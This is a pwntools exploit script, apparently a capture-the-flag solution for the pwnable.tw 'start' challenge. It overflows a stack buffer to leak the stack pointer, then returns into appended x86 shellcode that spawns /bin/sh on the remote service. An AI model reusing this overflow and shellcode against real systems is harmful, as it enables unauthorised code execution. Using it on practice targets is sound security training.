from pwn import *

#p = process('./start')
p = remote("chall.pwnable.tw", 10000)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31" + "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"

p.recv()
pay1 = "A"*20 + p32(0x8048087)

p.send(pay1)

leak = p.recv(4)
leak_esp = u32(leak)


pay2 = "A"*20 + p32(leak_esp + 20) + shellcode

p.send(pay2)

p.interactive()
